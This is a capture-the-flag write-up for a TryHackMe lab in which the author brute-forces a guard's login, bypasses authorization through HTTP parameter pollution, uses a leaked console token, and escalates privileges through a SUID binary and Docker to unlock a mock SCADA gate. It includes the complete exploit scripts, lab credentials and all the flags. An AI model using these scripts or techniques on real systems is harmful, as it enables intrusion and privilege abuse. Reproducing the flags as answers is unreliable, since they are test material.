# 🐰 HopSec Asylum - Prison Escape Challenge (Complete Writeup)

**Challenge:** The Great Disappearing Act
**Date Completed:** December 3, 2025  
**Author:** Mr. Umair

---

## 📖 The Story of Hopper the Court Jester

> *Once upon a time, there was a red-teaming mastermind turned court jester… our story begins with Hopper. Once feared as the ruthless Head of the Red Team Bunny Battalion, Hopper rose to the rank of Colonel with dizzying speed. The promotion filled him with such exhilaration and such hunger for more that it consumed his every thought. His soldiers mistook his growing twitch for stress and began calling him "Colonel Panic", but the truth was far more dangerous: the twitch came from his obsession with power, not fear.*
>
> *In those days, Hopper had already played a crucial, though conveniently forgotten, role in the earliest whispers of the Wareville siege. Buried beneath secrecy and denied by the crown, those first experiments in breaching new digital frontiers were Hopper's design. But when the King began distancing himself from the truth, Hopper's contributions were quietly erased from history, and his fall from grace accelerated. We now find Hopper in his prison cell in HopSec Asylum.*

---

## 🗺️ Facility Map & Escape Route

```
       +------------+             (Camera)             +------------+
       | Cell Block |               [O]                | Psych Ward |
       |    [O]     |                                  |            |
       +------------+           +-------+              +------------+
                                |       |
                                | Lobby |
                                |       |
                                +-------+
                                    ^
                                    |
+-----------------+                 |                 +------------------+
| Cells / Storage | ----------------+                 | Psych Ward Exit  |
|     (START)     | ================================> |       [O]        |
+-----------------+             (Path)                +---------+--------+
        ^                                                       |
        | Key 1                                                 |
                                                                |
                                                                v
                                                      +------------------+
                               Key 3                  |                  |
                              (EXIT) <=============== |  Main Corridor   |
                                 |                    |                  |
                                 v                    +------------------+

🗝️ Legend & Key Locations
━━━━━━━━━━━━━━━━━━━━━━━━━
[O]  = Security Cameras
==>  = The Escape Path

🔑 Key 1: Cells / Storage Door   → Unlocks Hopper's Cell     → FLAG 1
🔑 Key 2: Psych Ward Exit        → Requires 4-digit PIN      → FLAG 2 (Part 1)
🔑 Key 3: Main Corridor Exit     → SCADA Bypass Required     → FLAG 3
🚪 EXIT:  Final Escape Door      → Submit all 3 flags        → INVITE CODE
```

---

## 🎯 Challenge Objectives

| Step | Location | Objective | Flag |
|------|----------|-----------|------|
| 1 | Cells / Storage | Unlock Hopper's Cell | `THM{h0pp1ing_m4d}` |
| 2 | Psych Ward Exit | Bypass the Keypad | `THM{Y0u_h4ve_b3en_j3stered_739138}` |
| 3 | Main Corridor | SCADA Terminal Bypass | `THM{p0p_go3s_THe_W3as3l}` |
| 4 | Exit Door | Submit all flags | `THM{There.is.no.EASTmas.without.Hopper}` |

---

## ⚠️ Common Pitfall - Credential Discovery

**Many people get stuck here!** The credentials `guard.hopkins@hopsecasylum.com:Johnnyboy1982!` are **NOT** found through:
- ❌ Port 21337 (Side Quest unlock page)
- ❌ Default credentials or guessing
- ❌ The Security Console itself

**✅ The credentials are discovered through OSINT on the Fakebook application (Port 8000).**

You must:
1. Scan all ports on the target machine (`nmap -p- TARGET_IP`)
2. Find port 8000 running "Fakebook" (a social media clone)
3. Browse profiles to find `guard.hopkins@hopsecasylum.com`
4. Gather OSINT: Name (John Hopkins), nickname (Johnnyboy), birth year (1982)
5. Build a wordlist and brute force the login
6. Discover password: `Johnnyboy1982!`

See **Part 1, Step 2** below for the complete OSINT walkthrough.

---

## 🔓 Part 1: Unlocking Hopper's Cell (Flag 1)

### Step 1: Port Scanning & Service Discovery

First, we need to discover all services running on the target machine. Using `nmap`:

```bash
nmap -sV -p- TARGET_IP
```

**Key Services Found:**
- **Port 21337:** Side Quest unlock page (enter `now_you_see_me` to unlock challenge)
- **Port 8000:** Fakebook (social media clone) ⚠️ **Critical for credential discovery**
- **Port 8080:** HopSec Asylum Security Console
- **Port 13400:** Video Portal (frontend)
- **Port 13401:** Video Portal API (backend)

> **⚠️ Important:** Port 8000 (Fakebook) is essential for finding the credentials. The Side Quest unlock at port 21337 only activates the challenge—it does NOT provide credentials!

### Step 2: OSINT via Fakebook (Port 8000)

Navigate to `http://TARGET_IP:8000` to access the Fakebook application—a social media platform for HopSec staff.

#### Finding Guard Hopkins' Profile

1. **Browse user profiles** or search for "Hopkins"
2. **Locate the profile:** `guard.hopkins@hopsecasylum.com`
3. **Gather OSINT data** from the profile:
   - Full Name: **John Hopkins**
   - Position: **Security Guard at HopSec Asylum**
   - Birth Year: **1982**
   - Posts mention: **"Johnnyboy"** (nickname)

#### Credential Bruteforcing

Based on the OSINT, create a targeted wordlist:

**Password Pattern Analysis:**
- Nickname: `Johnnyboy`
- Birth Year: `1982`
- Common patterns: `Name + Year + Special`

**Create Wordlist:**
```bash
# Password candidates
Johnnyboy1982
Johnnyboy1982!
Johnnyboy82
johnny1982
Hopkins1982
...
```

**Brute Force Login (example using Python):**
```python
import requests

url = "http://TARGET_IP:8080/cgi-bin/login.sh"
email = "guard.hopkins@hopsecasylum.com"
passwords = ["Johnnyboy1982", "Johnnyboy1982!", "Johnnyboy82", ...]

for password in passwords:
    response = requests.post(url, data={"username": email, "password": password})
    if "Login Successful" in response.text or response.status_code == 200:
        print(f"[+] Found valid credentials: {email}:{password}")
        break
```

**✅ Valid Credentials Discovered:**
- **Username:** `guard.hopkins@hopsecasylum.com`
- **Password:** `Johnnyboy1982!`

### Step 3: Accessing the Security Console

Navigate to `http://TARGET_IP:8080` — the **HopSec Asylum Security Console**.

**Login Endpoint:** `/cgi-bin/login.sh`

Use the credentials found through Fakebook OSINT:
- **Username:** `guard.hopkins@hopsecasylum.com`
- **Password:** `Johnnyboy1982!`

### Step 4: Web Interface Analysis

After logging in, the security console revealed an interactive map with:
- 🔑 Key icons for door access
- 📹 Camera feeds
- 🚪 Exit door (hidden until all keys obtained)

### Step 5: Exploitation - Cell Door Unlock

The cell door was controlled via the `/cgi-bin/key_flag.sh` endpoint. As an authenticated user, we could remotely unlock Hopper's cell:

**Browser Console JavaScript:**
```javascript
// Step 1: Login to the Security Console
fetch("/cgi-bin/login.sh", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "username=guard.hopkins@hopsecasylum.com&password=Johnnyboy1982!"
})
.then(response => {
    if (response.ok) {
        console.log("✅ Login Successful!");
    } else {
        console.log("❌ Login Failed.");
    }
});

// Step 2: Unlock Hopper's Cell & Get Flag 1
fetch("/cgi-bin/key_flag.sh?door=hopper")
  .then(response => response.json())
  .then(data => {
      console.log("🔓 CELL UNLOCKED!");
      console.log("🚩 FLAG 1:", data.flag);
  });
```

**Response:**
```json
{"ok":true,"flag":"THM{h0pp1ing_m4d}"}
```

### ✅ Flag 1: `THM{h0pp1ing_m4d}`

---

## 📹 Part 2: The Camera Streams & Hidden Console (Flag 2)

### Step 1: API Discovery

A Video Stream API was discovered on port `13401`. This controlled the security camera feeds.

**API Base URL:** `http://TARGET_IP:13401/v1`

### Step 2: Authentication

```javascript
// Login to Video API
const loginData = JSON.stringify({ 
    username: 'guard.hopkins@hopsecasylum.com', 
    password: 'Johnnyboy1982!' 
});

fetch('http://TARGET:13401/v1/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: loginData
});
```

**Response:**
```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

### Step 3: Camera Enumeration

**Endpoint:** `GET /v1/cameras`

```json
{
  "cameras": [
    {"id": "cam-lobby", "name": "Lobby Camera", "required_role": "guard"},
    {"id": "cam-loading", "name": "Loading Dock", "required_role": "guard"},
    {"id": "cam-parking", "name": "Parking Lot", "required_role": "guard"},
    {"id": "cam-admin", "name": "Admin Office", "required_role": "admin"}
  ]
}
```

### Step 4: HTTP Parameter Pollution (HPP) Attack

The `cam-admin` camera required admin privileges, but we only had guard access. The API was vulnerable to **HTTP Parameter Pollution**.

**Vulnerability:** The server parsed parameters from both the query string AND request body. By sending conflicting `tier` values, we could bypass authorization.

**Exploit:**
- **Query String:** `?tier=admin` (processed first by authorization)
- **Request Body:** `{"camera_id": "cam-admin", "tier": "guard"}` (processed by validation)

**Raw HTTP Request (exploit_admin_cam.cjs):**
```javascript
const net = require('net');

const rawBody = JSON.stringify({ camera_id: 'cam-admin', tier: 'guard' });

const socket = net.createConnection({ host: TARGET, port: 13401 }, () => {
    const request = [
        `POST /v1/streams/request?tier=admin HTTP/1.1`,  // HPP: tier=admin in query
        `Host: ${TARGET}:13401`,
        `Authorization: Bearer ${token}`,
        `Content-Type: application/json`,
        `Content-Length: ${Buffer.byteLength(rawBody)}`,
        '',
        rawBody  // HPP: tier=guard in body
    ].join('\r\n');
    
    socket.write(request);
});
```

**Response:**
```json
{
  "ticket_id": "abc123...",
  "camera_id": "cam-admin",
  "effective_tier": "admin"  // SUCCESS! Authorization bypassed
}
```

### Step 5: HLS Manifest Analysis

Using the admin ticket, we retrieved the HLS manifest:

**Endpoint:** `GET /v1/streams/{ticket_id}/manifest.m3u8`

```m3u8
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:10
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-SESSION-DATA:DATA-ID="hopsec.diagnostics",VALUE="/v1/ingest/diagnostics"
#EXT-X-SESSION-DATA:DATA-ID="hopsec.jobs",VALUE="/v1/ingest/jobs"
#EXTINF:10.0,
/v1/streams/abc123/seg/cam-admin_seg0.ts?r=0
...
```

**Hidden Endpoints Found:**
- `/v1/ingest/diagnostics`
- `/v1/ingest/jobs`

### Step 6: Diagnostics Exploitation

**Triggering a Diagnostic Job:**

```javascript
// POST /v1/ingest/diagnostics
const payload = JSON.stringify({ 
    rtsp_url: 'rtsp://vendor-cam.test/cam-admin' 
});

const response = await fetch('/v1/ingest/diagnostics', {
    method: 'POST',
    headers: { 
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
    },
    body: payload
});
```

**Response:**
```json
{
  "job_id": "diag_12345",
  "job_status": "/v1/ingest/jobs/diag_12345"
}
```

### Step 7: Token Leakage via Job Status

**Fetching Job Status:**

```javascript
// GET /v1/ingest/jobs/diag_12345
const jobDetails = await fetch('/v1/ingest/jobs/diag_12345');
```

**Response (CRITICAL LEAK!):**
```json
{
  "job_id": "diag_12345",
  "status": "completed",
  "connection_details": {
    "console_port": 13404,
    "token": "4c4b6af1d85042fb9a6c20705605f8c2"
  }
}
```

### Step 8: Console Access & Flag Retrieval

**Console Access Script (get_console.cjs):**
```javascript
const net = require('net');

const TARGET = '10.49.181.137';
const PORT = 13404;
const TOKEN = '4c4b6af1d85042fb9a6c20705605f8c2';

const client = new net.Socket();

client.connect(PORT, TARGET, () => {
    console.log('Connected to console');
    client.write(TOKEN + '\n');
    
    setTimeout(() => {
        client.write('cd /home/svc_vidops && ls -la\n');
    }, 1000);

    setTimeout(() => {
        client.write('cat user_part2.txt\n');
    }, 2000);
});

client.on('data', (data) => {
    console.log('Received: ' + data);
});
```

**Output:**
```
$ cat user_part2.txt
j3stered_739138}
```

**Flag 2 (Combined):**
- Part 1 (from initial enum): `THM{Y0u_h4ve_b3en_`
- Part 2 (from console): `j3stered_739138}`

### ✅ Flag 2: `THM{Y0u_h4ve_b3en_j3stered_739138}`

---

## 🔧 Part 3: SCADA Terminal Bypass (Flag 3)

### Step 1: Discovering the SCADA Terminal

From the console shell, we discovered a SCADA terminal running on localhost:

```bash
$ ss -tlnp
LISTEN  0  128  127.0.0.1:9001  *:*  users:(("python3",pid=1234,fd=5))
```

### Step 2: SCADA Authentication

**Connecting to SCADA:**
```bash
$ nc 127.0.0.1 9001

################################################################################
#                                                                              #
#                    ██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗ ██████╗         #
#                    ██║  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔════╝         #
#                    ███████║██║   ██║██████╔╝███████╗█████╗  ██║              #
#                    ██╔══██║██║   ██║██╔═══╝ ╚════██║██╔══╝  ██║              #
#                    ██║  ██║╚██████╔╝██║     ███████║███████╗╚██████╗         #
#                    ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝ ╚═════╝         #
#                                                                              #
#                          ASYLUM SCADA CONTROL SYSTEM                         #
#                                                                              #
################################################################################

[!] Authentication Required
Enter maintenance token:
```

**Token:** Flag 2 (`THM{Y0u_h4ve_b3en_j3stered_739138}`) was the SCADA token!

```
> THM{Y0u_h4ve_b3en_j3stered_739138}
[+] Access Granted.
SCADA #LOCKED>
```

### Step 3: Finding the Unlock Code

The SCADA terminal required a **numeric unlock code**. After enumeration, we discovered:

**Code Location:** `/root/.asylum/unlock_code` inside Docker container `asylum_gate_control`

**The Problem:** We were running as `svc_vidops` with no root access.

### Step 4: Privilege Escalation via SUID Binary

**Discovery:**
```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/diag_shell
```

**Analysis:**
```bash
$ ls -la /usr/local/bin/diag_shell
-rwsr-xr-x 1 dockermgr dockermgr 16832 Dec  1 00:00 /usr/local/bin/diag_shell

$ file /usr/local/bin/diag_shell
/usr/local/bin/diag_shell: setuid ELF 64-bit LSB executable
```

The binary had **SUID** bit set and was owned by `dockermgr` (UID 1501).

**Key Insight:** The binary sets UID to `dockermgr` but NOT the GID. To access Docker, we needed to use `sg docker` to temporarily gain docker group privileges.

### Step 5: Extracting the Unlock Code

**The Command Chain:**
```bash
$ echo 'sg docker -c "docker exec -u root asylum_gate_control cat /root/.asylum/unlock_code"' | /usr/local/bin/diag_shell
739184627
```

**Breakdown:**
1. `diag_shell` - Spawns bash with UID set to dockermgr (1501)
2. `sg docker` - Executes command with docker group privileges
3. `docker exec -u root` - Runs command as root inside container
4. `cat /root/.asylum/unlock_code` - Reads the unlock code

### Step 6: Unlocking the SCADA Gate

**Automation Script (read_scada.cjs):**
```javascript
const net = require('net');

const TARGET = '10.49.181.137';
const PORT = 13404;
const TOKEN = '4c4b6af1d85042fb9a6c20705605f8c2';

const commands = [
    `(echo "THM{Y0u_h4ve_b3en_j3stered_739138}"; sleep 1; echo "unlock 739184627"; sleep 1; echo "status") | nc 127.0.0.1 9001`,
];

function runCommand(cmd) {
    return new Promise((resolve) => {
        const client = new net.Socket();

        client.connect(PORT, TARGET, () => {
            console.log(`[+] Running: ${cmd}`);
            client.write(TOKEN + '\n');
            setTimeout(() => {
                client.write(cmd + '\n');
            }, 500);
        });

        client.on('data', (data) => {
            process.stdout.write(data.toString());
        });

        client.on('close', () => resolve());
        client.on('error', (err) => {
            console.log('Error:', err.message);
            resolve();
        });

        setTimeout(() => client.destroy(), 5000);
    });
}

async function main() {
    for (const cmd of commands) {
        await runCommand(cmd);
    }
}

main();
```

**SCADA Response:**
```
SCADA #LOCKED> unlock 739184627
[+] Unlock code accepted.
[+] Gate status: UNLOCKED

SCADA #UNLOCKED> status
=== SCADA Status ===
Gate Status: UNLOCKED
Mode: Manual Override Active
```

### Step 7: Retrieving Flag 3 via Web Interface

With the SCADA gate unlocked, we could now access the exit door on port 8080:

```bash
$ curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "code=739184627" \
    "http://127.0.0.1:8080/cgi-bin/exit_check.sh"
```

**Response:**
```json
{"ok":true,"flag":"THM{p0p_go3s_THe_W3as3l}"}
```

### ✅ Flag 3: `THM{p0p_go3s_THe_W3as3l}`

---

## 🚪 Part 4: The Final Escape (Invite Code)

### Submitting All Three Flags

With all three flags obtained, we could finally escape the facility:

```bash
$ curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "flag1=THM{h0pp1ing_m4d}&flag2=THM{Y0u_h4ve_b3en_j3stered_739138}&flag3=THM{p0p_go3s_THe_W3as3l}" \
    http://127.0.0.1:8080/cgi-bin/escape_check.sh
```

**Response:**
```json
{
  "ok": true,
  "invite_url": "https://static-labs.tryhackme.cloud/apps/hoppers-invitation/",
  "invite_code": "THM{There.is.no.EASTmas.without.Hopper}"
}
```

### ✅ Invite Code: `THM{There.is.no.EASTmas.without.Hopper}`

---

## 📜 Complete Scripts Used

### 1. explore_new_ip.cjs - Full API Exploitation Script

```javascript
const http = require('http');

const TARGET = '10.49.181.137';
const PORT = 13401;
const EMAIL = 'guard.hopkins@hopsecasylum.com';
const PASSWORD = 'Johnnyboy1982!';

function httpRequest(options, postData = null) {
    return new Promise((resolve, reject) => {
        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
        });
        req.on('error', reject);
        if (postData) req.write(postData);
        req.end();
    });
}

async function main() {
    console.log(`[+] Connecting to ${TARGET}:${PORT}...`);

    // 1. Login
    const loginData = JSON.stringify({ username: EMAIL, password: PASSWORD });
    const loginRes = await httpRequest({
        hostname: TARGET,
        port: PORT,
        path: '/v1/auth/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(loginData) }
    }, loginData);
    
    const token = JSON.parse(loginRes.body).token;
    console.log('[+] Logged in.');

    // 2. List Cameras
    const camRes = await httpRequest({
        hostname: TARGET,
        port: PORT,
        path: '/v1/cameras',
        method: 'GET',
        headers: { 'Authorization': `Bearer ${token}` }
    });

    const cameras = JSON.parse(camRes.body).cameras;
    console.log(`Found ${cameras.length} cameras`);

    // 3. Exploit cam-admin via HPP
    console.log('Using EXPLOIT for cam-admin (Parameter Pollution)...');
    const rawBody = JSON.stringify({ camera_id: 'cam-admin', tier: 'guard' });
    
    const ticketResData = await new Promise((resolve) => {
        const net = require('net');
        const socket = net.createConnection({ host: TARGET, port: PORT }, () => {
            const request = [
                `POST /v1/streams/request?tier=admin HTTP/1.1`,
                `Host: ${TARGET}:${PORT}`,
                `Authorization: Bearer ${token}`,
                `Content-Type: application/json`,
                `Content-Length: ${Buffer.byteLength(rawBody)}`,
                '',
                rawBody
            ].join('\r\n');
            
            socket.write(request);
            let data = '';
            socket.on('data', chunk => data += chunk.toString());
            socket.on('end', () => resolve(data));
        });
    });

    const bodyIndex = ticketResData.indexOf('\r\n\r\n');
    const body = ticketResData.substring(bodyIndex + 4);
    const ticketId = JSON.parse(body).ticket_id;
    console.log(`Got admin ticket: ${ticketId}`);

    // 4. Fetch Manifest & Find Hidden URLs
    const manifestRes = await httpRequest({
        hostname: TARGET,
        port: PORT,
        path: `/v1/streams/${ticketId}/manifest.m3u8`, 
        method: 'GET',
        headers: { 'Authorization': `Bearer ${token}` }
    });

    const lines = manifestRes.body.split('\n');
    const extraUrls = [];
    lines.forEach(line => {
        if (line.includes('VALUE="')) {
            const match = line.match(/VALUE="([^"]+)"/);
            if (match) extraUrls.push(match[1]);
        }
    });

    // 5. Trigger Diagnostics Job
    const diagUrl = extraUrls.find(u => u.includes('diagnostics'));
    if (diagUrl) {
        console.log(`Triggering job at ${diagUrl}...`);
        const payload = JSON.stringify({ rtsp_url: 'rtsp://vendor-cam.test/cam-admin' });
        const jobRes = await httpRequest({
            hostname: TARGET,
            port: PORT,
            path: diagUrl,
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            }
        }, payload);
        
        const jobStatusUrl = JSON.parse(jobRes.body).job_status;
        console.log(`Job Status URL: ${jobStatusUrl}`);

        // 6. Get Console Token
        const statusRes = await httpRequest({
            hostname: TARGET,
            port: PORT,
            path: jobStatusUrl,
            method: 'GET',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        console.log('Job Details:', statusRes.body);
    }
}

main();
```

### 2. get_console.cjs - Console Access Script

```javascript
const net = require('net');

const TARGET = '10.49.181.137';
const PORT = 13404;
const TOKEN = '4c4b6af1d85042fb9a6c20705605f8c2';

const client = new net.Socket();

client.connect(PORT, TARGET, () => {
    console.log('Connected to console');
    client.write(TOKEN + '\n');
    
    setTimeout(() => {
        console.log('Sending cd /home/svc_vidops && ls -la...');
        client.write('cd /home/svc_vidops && ls -la\n');
    }, 1000);

    setTimeout(() => {
        console.log('Sending cat user_part2.txt...');
        client.write('cat user_part2.txt\n');
    }, 2000);
});

client.on('data', (data) => {
    console.log('Received: ' + data);
});

client.on('close', () => {
    console.log('Connection closed');
});
```

### 3. read_scada.cjs - SCADA Interaction & Flag Submission Script

```javascript
const net = require('net');

const TARGET = '10.49.181.137';
const PORT = 13404;
const TOKEN = '4c4b6af1d85042fb9a6c20705605f8c2';

const commands = [
    // Command to unlock SCADA gate
    `(echo "THM{Y0u_h4ve_b3en_j3stered_739138}"; sleep 1; echo "unlock 739184627"; sleep 1; echo "status") | nc 127.0.0.1 9001`,
    
    // Or for final escape submission:
    // `curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "flag1=THM{h0pp1ing_m4d}&flag2=THM{Y0u_h4ve_b3en_j3stered_739138}&flag3=THM{p0p_go3s_THe_W3as3l}" http://127.0.0.1:8080/cgi-bin/escape_check.sh`,
];

function runCommand(cmd) {
    return new Promise((resolve) => {
        const client = new net.Socket();

        client.connect(PORT, TARGET, () => {
            console.log(`[+] Running: ${cmd}`);
            client.write(TOKEN + '\n');
            setTimeout(() => {
                client.write(cmd + '\n');
            }, 500);
        });

        client.on('data', (data) => {
            process.stdout.write(data.toString());
        });

        client.on('close', () => resolve());
        client.on('error', (err) => {
            console.log('Error:', err.message);
            resolve();
        });

        setTimeout(() => client.destroy(), 5000);
    });
}

async function main() {
    for (const cmd of commands) {
        await runCommand(cmd);
    }
}

main();
```

### 4. interact_scada_via_console.cjs - Interactive SCADA Access

```javascript
const net = require('net');

const TARGET = '10.49.181.137';
const PORT = 13404;
const CONSOLE_TOKEN = '4c4b6af1d85042fb9a6c20705605f8c2';
const SCADA_TOKEN = 'THM{Y0u_h4ve_b3en_j3stered_739138}';

const client = new net.Socket();

client.connect(PORT, TARGET, () => {
    console.log('[+] Connected to Console');
    client.write(CONSOLE_TOKEN + '\n');
});

client.on('data', (data) => {
    const output = data.toString();
    process.stdout.write(output);
});

setTimeout(() => {
    console.log('\n[+] Sending nc command...');
    client.write('nc 127.0.0.1 9001\n');
}, 1000);

setTimeout(() => {
    console.log('\n[+] Sending SCADA Token...');
    client.write(SCADA_TOKEN + '\n');
}, 3000);

process.stdin.pipe(client); // Allow manual interaction
```

### 5. exploit_admin_cam.cjs - HTTP Parameter Pollution Exploit

```javascript
const http = require('http');
const fs = require('fs');

const TARGET = '10.49.181.137';
const API_PORT = 13401;
const EMAIL = 'guard.hopkins@hopsecasylum.com';
const PASSWORD = 'Johnnyboy1982!';

function httpRequest(options, postData = null) {
    return new Promise((resolve, reject) => {
        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
        });
        req.on('error', reject);
        if (postData) req.write(postData);
        req.end();
    });
}

async function main() {
    console.log('Logging in...');
    const loginData = JSON.stringify({ username: EMAIL, password: PASSWORD });
    const loginRes = await httpRequest({
        hostname: TARGET,
        port: API_PORT,
        path: '/v1/auth/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(loginData) }
    }, loginData);
    
    if (loginRes.status !== 200) {
        console.error('Login failed:', loginRes.body);
        return;
    }
    const token = JSON.parse(loginRes.body).token;
    console.log('Got token:', token.substring(0, 30) + '...');

    console.log('Requesting admin camera ticket via HPP...');
    const rawBody = JSON.stringify({ camera_id: 'cam-admin', tier: 'guard' });
    const ticketRes = await new Promise((resolve) => {
        const socket = require('net').createConnection({ host: TARGET, port: API_PORT }, () => {
            const request = [
                `POST /v1/streams/request?tier=admin HTTP/1.1`,
                `Host: ${TARGET}:${API_PORT}`,
                `Authorization: Bearer ${token}`,
                `Content-Type: application/json`,
                `Content-Length: ${Buffer.byteLength(rawBody)}`,
                '',
                rawBody
            ].join('\r\n');
            
            socket.write(request);
            let data = '';
            socket.on('data', chunk => data += chunk.toString());
            socket.on('end', () => resolve(data));
        });
    });

    const bodyIndex = ticketRes.indexOf('\r\n\r\n');
    const body = ticketRes.substring(bodyIndex + 4);
    let ticketId;
    try {
        const json = JSON.parse(body);
        if (json.effective_tier === 'admin') {
            console.log('SUCCESS! Got admin tier ticket.');
            ticketId = json.ticket_id;
        } else {
            console.log('Failed to get admin tier.');
            return;
        }
    } catch (e) { return; }
}

main();
```

---

## 🛡️ Vulnerabilities Exploited

| # | Vulnerability | Impact | Severity |
|---|---------------|--------|----------|
| 1 | Weak Credentials | Initial access to web console | High |
| 2 | HTTP Parameter Pollution | Bypass authorization for admin camera | Critical |
| 3 | Information Disclosure in HLS Manifest | Discovery of hidden API endpoints | Medium |
| 4 | Token Leakage via Job Status | Console access token exposed | Critical |
| 5 | SUID Binary Privilege Escalation | Access to Docker as privileged user | Critical |
| 6 | Insecure Docker Configuration | Root access inside container | High |

---

## 🔐 CGI Endpoints Reference

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/cgi-bin/login.sh` | POST | Authentication with username/password |
| `/cgi-bin/session_check.sh` | GET | Verify session status |
| `/cgi-bin/key_flag.sh?door=hopper` | GET | Unlock cell door & get Flag 1 |
| `/cgi-bin/psych_check.sh` | POST | Psych ward door check |
| `/cgi-bin/exit_check.sh` | POST | Exit door unlock with SCADA code |
| `/cgi-bin/escape_check.sh` | POST | Final escape - submit all 3 flags |

---

## 🏆 Summary of Flags

| Flag | Value | Location |
|------|-------|----------|
| **Flag 1** | `THM{h0pp1ing_m4d}` | Cell Door (hopper) |
| **Flag 2** | `THM{Y0u_h4ve_b3en_j3stered_739138}` | Console + Psych Ward |
| **Flag 3** | `THM{p0p_go3s_THe_W3as3l}` | SCADA Exit Door |
| **Invite Code** | `THM{There.is.no.EASTmas.without.Hopper}` | Final Escape |

---

## 🔗 Invitation to Next Challenge

**URL:** `https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`

**Invite Code:** `THM{There.is.no.EASTmas.without.Hopper}`

---

## 📝 Key Takeaways

1. **HTTP Parameter Pollution** can bypass authorization when servers parse parameters from multiple sources (query string + body)
2. **Hidden metadata in streaming manifests** (like HLS) can leak internal endpoints
3. **SUID binaries** require careful analysis - they may set UID but not GID
4. **`sg` command** can be used to execute commands with specific group privileges
5. **Docker containers** running as root can be exploited if an attacker gains docker group access

---

## 🐰 Hopper's 5-Step Escape Plan (Complete)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        HOPPER'S ESCAPE SUMMARY                               │
├─────────────────────────────────────────────────────────────────────────────┤
│  ✅ Step 1: Unlock Hopper's Cell                                             │
│     └── Exploited: /cgi-bin/key_flag.sh?door=hopper                         │
│     └── Flag 1: THM{h0pp1ing_m4d}                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│  ✅ Step 2: Move Through the Lobby                                           │
│     └── Enumerated camera API on port 13401                                 │
│     └── Used HPP to access admin camera                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│  ✅ Step 3: Bypass the Psych Ward Keypad                                     │
│     └── Found hidden diagnostics endpoint in HLS manifest                   │
│     └── Leaked console token via job status                                 │
│     └── Flag 2: THM{Y0u_h4ve_b3en_j3stered_739138}                          │
├─────────────────────────────────────────────────────────────────────────────┤
│  ✅ Step 4: Reach the Main Corridor                                          │
│     └── SCADA terminal on localhost:9001                                    │
│     └── Privilege escalation via /usr/local/bin/diag_shell                  │
│     └── Unlock code: 739184627                                              │
│     └── Flag 3: THM{p0p_go3s_THe_W3as3l}                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│  ✅ Step 5: Escape the Facility                                              │
│     └── Submitted all 3 flags to /cgi-bin/escape_check.sh                   │
│     └── Invite Code: THM{There.is.no.EASTmas.without.Hopper}                │
│     └── URL: https://static-labs.tryhackme.cloud/apps/hoppers-invitation/   │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🎭 Bonus: Hopper's Invitation Decryption

### The Hidden Room

After escaping, the invite code led to a mysterious website with a countdown timer and encrypted file.

**Website:** `https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`

**Encrypted File:** `https://assets.tryhackme.com/additional/aoc2025/files/hopper-origins.txt`

### Decryption Process

The website's JavaScript revealed the encryption algorithm:
- **Algorithm:** AES-256-GCM
- **Key Derivation:** PBKDF2 with 100,000 iterations (SHA-256)
- **Password:** `THM{There.is.no.EASTmas.without.Hopper}` (from escape_check.sh)

**Encrypted Data Structure:**
```
Bytes 0-15:  Salt (16 bytes)
Bytes 16-27: IV (12 bytes for GCM mode)
Bytes 28-43: Additional Authenticated Data (16 bytes)
Bytes 44+:   Ciphertext
```

### Python Decryption Script

```python
#!/usr/bin/env python3
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Download fresh ciphertext after timer expires
ciphertext_b64 = "hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI"
password = "THM{There.is.no.EASTmas.without.Hopper}"

# Decode and parse
encrypted_data = base64.b64decode(ciphertext_b64)
salt = encrypted_data[0:16]
iv = encrypted_data[16:28]
aad = encrypted_data[28:44]
ciphertext = encrypted_data[44:]

# Derive key using PBKDF2
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = kdf.derive(password.encode())

# Decrypt with AES-GCM
combined_data = ciphertext + aad
aesgcm = AESGCM(key)
plaintext_bytes = aesgcm.decrypt(iv, combined_data, None)
plaintext = plaintext_bytes.decode('utf-8')

print(plaintext)
# Output: https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
```

### The Secret Room

**Decrypted URL:** `https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX`

This unlocked a hidden TryHackMe room revealing Hopper's backstory and origins! 🎉

### Technical Notes

